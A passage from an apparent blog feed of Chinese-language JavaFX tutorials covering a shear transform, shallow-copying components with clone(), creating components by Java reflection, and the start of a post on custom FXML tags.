:sob:</del></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button1&quot;</span>);<br>    b1.setPrefHeight(<span class="hljs-number">100</span>);<br>    b1.setPrefWidth(<span class="hljs-number">200</span>);<br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button2&quot;</span>);<br>    b2.setStyle(<span class="hljs-string">&quot;-fx-background-color: #0cda0c;&quot;</span>);<br>    b2.setOpacity(<span class="hljs-number">0.5</span>);<br>    b2.setPrefHeight(<span class="hljs-number">100</span>);<br>    b2.setPrefWidth(<span class="hljs-number">200</span>);<br><br>    <span class="hljs-type">Shear</span> <span class="hljs-variable">shear</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shear</span>(<span class="hljs-number">0.5</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    b2.getTransforms().add(shear);<br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">b3</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;Button3&quot;</span>);<br>    b3.setPrefWidth(<span class="hljs-number">200</span>);<br>    b3.setPrefHeight(<span class="hljs-number">100</span>);<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">root</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    root.getChildren().addAll(b1, b2, b3);<br><br>    AnchorPane.setTopAnchor(b1, <span class="hljs-number">100.0</span>);<br>    AnchorPane.setLeftAnchor(b1, <span class="hljs-number">100.0</span>);<br><br>    AnchorPane.setTopAnchor(b2, <span class="hljs-number">100.0</span>);<br>    AnchorPane.setLeftAnchor(b2, <span class="hljs-number">100.0</span>);<br><br>    AnchorPane.setTopAnchor(b3, <span class="hljs-number">300.0</span>);<br>    AnchorPane.setLeftAnchor(b3, <span class="hljs-number">300.0</span>);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(root);<br>    primaryStage.setScene(scene);<br>    primaryStage.setHeight(<span class="hljs-number">800</span>);<br>    primaryStage.setWidth(<span class="hljs-number">800</span>);<br>    primaryStage.show();<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221005201644656.png" alt="image-20221005201644656"></p>]]></content>
    
    
    <categories>
      
      <category>javafx</category>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>javafx</tag>
      
      <tag>gui</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[javafx] 复制组件及通过反射创建组件</title>
    <link href="/2022/10/04/%5Bjavafx%5D%20%E5%A4%8D%E5%88%B6%E7%BB%84%E4%BB%B6%E5%8F%8A%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%88%9B%E5%BB%BA%E7%BB%84%E4%BB%B6/"/>
    <url>/2022/10/04/%5Bjavafx%5D%20%E5%A4%8D%E5%88%B6%E7%BB%84%E4%BB%B6%E5%8F%8A%E9%80%9A%E8%BF%87%E5%8F%8D%E5%B0%84%E5%88%9B%E5%BB%BA%E7%BB%84%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<h1 id="复制组件及通过反射创建组件"><a href="#复制组件及通过反射创建组件" class="headerlink" title="复制组件及通过反射创建组件"></a>复制组件及通过反射创建组件</h1><h2 id="通过clone方法复制组件"><a href="#通过clone方法复制组件" class="headerlink" title="通过clone方法复制组件"></a>通过<code>clone</code>方法复制组件</h2><p>java中有<code>clone</code>方法，可以进行<strong>浅拷贝</strong>。</p><p>定义一个<code>MyButton</code>类，继承<code>Button</code>并实现<code>Cloneable</code>接口，构造方法与<code>Button</code>一样，可以查看源码，然后重写<code>clone</code>方法，返回类型修改为<code>Node</code>，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyButton</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Button</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cloneable</span>&#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyButton</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">super</span>();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyButton</span><span class="hljs-params">(String text)</span>&#123;<br>        <span class="hljs-built_in">super</span>(text);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyButton</span><span class="hljs-params">(String text, Node node)</span>&#123;<br>        <span class="hljs-built_in">super</span>(text, node);<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> Node <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException &#123;<br>        <span class="hljs-keyword">return</span> (Node) <span class="hljs-built_in">super</span>.clone();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>然后实例化<code>MyButton</code>按钮，设置属性，并绑定点击事件，并进行<code>clone</code>，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">MyButton</span> <span class="hljs-variable">myButton</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyButton</span>(<span class="hljs-string">&quot;按钮1&quot;</span>);<br>    myButton.setPrefHeight(<span class="hljs-number">200</span>);<br>    myButton.setPrefWidth(<span class="hljs-number">200</span>);<br>    myButton.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;button&quot;</span>);<br>        &#125;<br>    &#125;);<br><br>    <span class="hljs-type">MyButton</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> (MyButton) myButton.clone();<br><br>    System.out.println(<span class="hljs-string">&quot;mybutton  &quot;</span> + myButton);<br>    System.out.println(<span class="hljs-string">&quot;node      &quot;</span> + node);<br><br>    <span class="hljs-type">HBox</span> <span class="hljs-variable">hBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HBox</span>(<span class="hljs-number">20</span>);<br>    hBox.getChildren().addAll(myButton, node);<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    anchorPane.getChildren().add(hBox);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>    primaryStage.setScene(scene);<br>    primaryStage.setHeight(<span class="hljs-number">500</span>);<br>    primaryStage.setWidth(<span class="hljs-number">500</span>);<br>    primaryStage.show();<br>&#125;<br><br></code></pre></td></tr></table></figure><p>运行后发现<code>node</code>与<code>myButton</code>是完全相同的按钮，包括属性以及点击事件，即使两者是两个不同的实例。上面的打印结果为：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mel">mybutton  MyButton@dc558b[styleClass=<span class="hljs-keyword">button</span>]<span class="hljs-string">&#x27;按钮1&#x27;</span><br>node      MyButton@6be1b7[styleClass=<span class="hljs-keyword">button</span>]<span class="hljs-string">&#x27;按钮1&#x27;</span><br></code></pre></td></tr></table></figure><p>现在设置<code>node</code>的名称：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">node.setText(<span class="hljs-string">&quot;按钮2&quot;</span>);<br></code></pre></td></tr></table></figure><p>运行后发现<code>myButton</code>的名称也改变了。</p><p>所以通过这种方法复制组件是很危险的，很可能造成牵一发而动全身的后果。慎用。</p><hr><hr><p>另外举一个例子，想要通过点击复制一个布局，实现这样的一个类，继承了<code>HBox</code>，其中包括了两个组件，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">class</span> <span class="hljs-title class_">MyPane</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">HBox</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cloneable</span>&#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">TextArea</span> <span class="hljs-variable">textArea</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TextArea</span>();<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Button</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;按钮&quot;</span>);<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">MyPane</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-built_in">super</span>(textArea, button);<br>    &#125;<br><br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">protected</span> MyPane <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> CloneNotSupportedException &#123;<br>        <span class="hljs-keyword">return</span> (MyPane) <span class="hljs-built_in">super</span>.clone();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>在主函数中这样写，主要是通过点击来复制节点，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><br>    <span class="hljs-type">MyPane</span> <span class="hljs-variable">myPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">MyPane</span>();<br>    System.out.println(myPane);<br>    System.out.println(myPane.getChildren().get(<span class="hljs-number">0</span>));<br>    System.out.println(myPane.getChildren().get(<span class="hljs-number">1</span>));<br>    <span class="hljs-type">VBox</span> <span class="hljs-variable">vBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">VBox</span>();<br>    vBox.getChildren().add(myPane);<br>    System.out.println(vBox.getChildren().size());<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    anchorPane.getChildren().add(vBox);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>    primaryStage.setScene(scene);<br>    primaryStage.setHeight(<span class="hljs-number">500</span>);<br>    primaryStage.setWidth(<span class="hljs-number">500</span>);<br>    primaryStage.show();<br><br>    <span class="hljs-type">Button</span> <span class="hljs-variable">button</span> <span class="hljs-operator">=</span> (Button) myPane.getChildren().get(<span class="hljs-number">1</span>);<br>    button.setOnAction(<span class="hljs-keyword">new</span> <span class="hljs-title class_">EventHandler</span>&lt;ActionEvent&gt;() &#123;<br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">handle</span><span class="hljs-params">(ActionEvent event)</span> &#123;<br><br>            <span class="hljs-keyword">try</span> &#123;<br>                <span class="hljs-type">MyPane</span> <span class="hljs-variable">clone</span> <span class="hljs-operator">=</span> myPane.clone();<br>                System.out.println(clone);<br>                vBox.getChildren().add(clone);<br>                System.out.println(myPane.getChildren().get(<span class="hljs-number">0</span>));<br>                System.out.println(myPane.getChildren().get(<span class="hljs-number">1</span>));<br>                System.out.println(vBox.getChildren().size());<br>            &#125; <span class="hljs-keyword">catch</span> (CloneNotSupportedException e) &#123;<br>                e.printStackTrace();<br>            &#125;<br><br>        &#125;<br>    &#125;);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>最后实现效果为：</p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004231804489.png" alt="image-20221004231804489"></p><p><img src="https://picgo-1307028727.cos.ap-chengdu.myqcloud.com/picgo/image-20221004231813362.png" alt="image-20221004231813362"></p><p>打印结果为：</p><figure class="highlight mel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs mel">MyPane@1e38b09<br>TextArea@d95460[styleClass=<span class="hljs-keyword">text</span>-input <span class="hljs-keyword">text</span>-area]<br>Button@b07401[styleClass=<span class="hljs-keyword">button</span>]<span class="hljs-string">&#x27;按钮&#x27;</span><br><span class="hljs-number">1</span><br>MyPane@d5192<br>TextArea@d95460[styleClass=<span class="hljs-keyword">text</span>-input <span class="hljs-keyword">text</span>-area]<br>Button@b07401[styleClass=<span class="hljs-keyword">button</span>]<span class="hljs-string">&#x27;按钮&#x27;</span><br><span class="hljs-number">2</span><br>MyPane@74617d<br>TextArea@d95460[styleClass=<span class="hljs-keyword">text</span>-input <span class="hljs-keyword">text</span>-area]<br>Button@b07401[styleClass=<span class="hljs-keyword">button</span>]<span class="hljs-string">&#x27;按钮&#x27;</span><br><span class="hljs-number">3</span><br><br></code></pre></td></tr></table></figure><p>可以看到确实增<code>MyPane</code>布局，但是<code>TextArea</code>和<code>Button</code>并没有复制，每次都被“拿到“了下一个布局中。</p><h2 id="通过java反射创建节点组件"><a href="#通过java反射创建节点组件" class="headerlink" title="通过java反射创建节点组件"></a>通过<code>java</code>反射创建节点组件</h2><p>通过反射得到类名，然后利用类名创建对象，并进行实例化。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-meta">@Override</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-type">Node</span> <span class="hljs-variable">node</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Button</span>(<span class="hljs-string">&quot;按钮&quot;</span>);<br>    <span class="hljs-comment">// 得到节点类完整名称，javafx.scene.control.Button</span><br>    <span class="hljs-type">String</span> <span class="hljs-variable">name</span> <span class="hljs-operator">=</span> node.getClass().getName();<br>    System.out.println(name);<br>    <span class="hljs-comment">// 根据类名创建对象</span><br>    Class&lt;?&gt; classtype = Class.forName(name);<br>    <span class="hljs-comment">// 通过构造方法实例化</span><br>    <span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> (Node) classtype.getConstructor(<span class="hljs-literal">null</span>).newInstance(<span class="hljs-literal">null</span>);<br>    <br>    <span class="hljs-type">HBox</span> <span class="hljs-variable">hBox</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HBox</span>(<span class="hljs-number">20</span>);<br>    hBox.getChildren().addAll(node, node2);<br><br>    <span class="hljs-type">AnchorPane</span> <span class="hljs-variable">anchorPane</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">AnchorPane</span>();<br>    anchorPane.getChildren().add(hBox);<br><br>    <span class="hljs-type">Scene</span> <span class="hljs-variable">scene</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Scene</span>(anchorPane);<br>    primaryStage.setScene(scene);<br>    primaryStage.setHeight(<span class="hljs-number">500</span>);<br>    primaryStage.setWidth(<span class="hljs-number">500</span>);<br>    primaryStage.show();<br>&#125;<br></code></pre></td></tr></table></figure><p>这样会创建和<code>node</code>完全相同的对象。<code>node2</code>是根据<code>node</code>的类名创建的。</p><p>如果想要修改组件，比如将<code>Button</code>修改为<code>Label</code>，只需要修改<code>node</code>的组件就行了。</p><p>这里并没有指定参数，即<code>Button</code>的名称，如果想要指定参数，可以通过构造方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">Node</span> <span class="hljs-variable">node2</span> <span class="hljs-operator">=</span> (Node) classtype.getConstructor(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[]&#123;String.class&#125;).newInstance(<span class="hljs-string">&quot;按钮2&quot;</span>);<br></code></pre></td></tr></table></figure><p>这句话的意思是找到一个构造方法，这个构造方法需要一个<code>String</code>类型的参数，然后在实例化时设置参数为<code>按钮2</code>。</p><p>或者可以通过方法来修改，<code>Button</code>设置名称的方法是<code>setText</code>，既然已经得到对象并实例化了，那么就可以找到这个方法，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 找到一个方法setText，参数为String类型</span><br><span class="hljs-type">Method</span> <span class="hljs-variable">method</span> <span class="hljs-operator">=</span> classtype.getMethod(<span class="hljs-string">&quot;setText&quot;</span>, String.class);<br><span class="hljs-comment">// 调用node2的setText方法，并设置参数为 按钮2</span><br>method.invoke(node2, <span class="hljs-string">&quot;按钮2&quot;</span>);<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>javafx</category>
      
      <category>java</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
      <tag>javafx</tag>
      
      <tag>gui</tag>
      
      <tag>java反射</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[javafx] 利用Builder和BuilderFactory接口读取自定义FXML标签</title>
    <link href="/2022/10/04/%5Bjavafx%5D%20%E5%88%A9%E7%94%A8Builder%E5%92%8CBuilderFactory%E6%8E%A5%E5%8F%A3%E8%AF%BB%E5%8F%96%E8%87%AA%E5%AE%9A%E4%B9%89FXML%E6%A0%87%E7%AD%BE/"/>
    <url>/2022/10/04/%5Bjavafx%5D%20%E5%88%A9%E7%94%A8Builder%E5%92%8CBuilderFactory%E6%8E%A5%E5%8F%A3%E8%AF%BB%E5%8F%96%E8%87%AA%E5%AE%9A%E4%B9%89FXML%E6%A0%87%E7%AD%BE/</url>
    
    <content type="html"><![CDATA[<h1 id="利用Builder和BuilderFactory接口读取自定义FXML标签"><a href="#利用Builder和BuilderFactory接口读取自定义FXML标签" class="headerlink" title="利用Builder和BuilderFactory接口读取自定义FXML标签"></a>利用Builder和BuilderFactory接口读取自定义FXML标签</h1><p>FXML是可以自定义标签的。</p><h2 id="无参构造"><a href="#无参构造" class="headerlink" title="无参构造"></a>无参构造</h2><p>定义了这样的一个类<code>Person</code>，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample.datatype;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-keyword">private</span> String name;<br>    <span class="hljs-keyword">private</span> <span class="hljs-type">int</span> age;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Person</span><span class="hljs-params">()</span>&#123;<br>        System.out.println(<span class="hljs-string">&quot;实例化Person&quot;</span>);    <br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getName</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setName</span><span class="hljs-params">(String name)</span> &#123;<br>        <span class="hljs-built_in">this</span>.name = name;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getAge</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> age;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setAge</span><span class="hljs-params">(<span class="hljs-type">int</span> age)</span> &#123;<br>        <span class="hljs-built_in">this</span>.age = age;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后FXML文件<code>customTag.fxml</code>这样写，</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;?import sample.datatype.Person?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">Person</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">Person</span>&gt;</span><br></code></pre></td></tr></table></figure><p>最后在<code>customMain</code>加载FXML文件，并设置和输出属性，</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> sample;<br><br><span class="hljs-keyword">import</span> javafx.application.Application;<br><span class="hljs-keyword">import</span> javafx.fxml.FXMLLoader;<br><span class="hljs-keyword">import</span> javafx.stage.Stage;<br><span class="hljs-keyword">import</span> sample.datatype.Person;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">customMain</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Application</span><br>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        launch(args);<br>    &#125;<br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">start</span><span class="hljs-params">(Stage primaryStage)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Person</span> <span class="hljs-variable">person</span> <span class="hljs-operator">=</span> FXMLLoader.load(getClass().getResource(<span class="hljs-string">&quot;Gui/customTag.fxml&quot;</span>));<br><br>        person.setName(<span class="hljs-string">&quot;YY&quot;</span>);<br>        System.out.println(person.getName());<br><br>        primaryStage.show();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这样就会首先会实例化<code>Person</code>，然后打印<code>实例化Person</code>，以及设置的<code>name</code>，即<code>YY</code>。</p><hr><hr><p>如果使用的是<code>HashMap</code>，可以这样写FXML：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><br><span class="hljs-meta">&lt;?import java.util.HashMap?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">HashMap</span> <span class="hljs-attr">a</span>=<span class="hljs-string">&quot;1&quot;</span> <span class="hljs-attr">b</span>=<span class="hljs-string">&quot;2&quot;</span>&gt;</span><br><br><span class="hljs-tag">&lt;/<span class="hljs-name">HashMap</span>&gt;</span><br></code></pre></td></tr></table></figure><p>加载时这样写：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 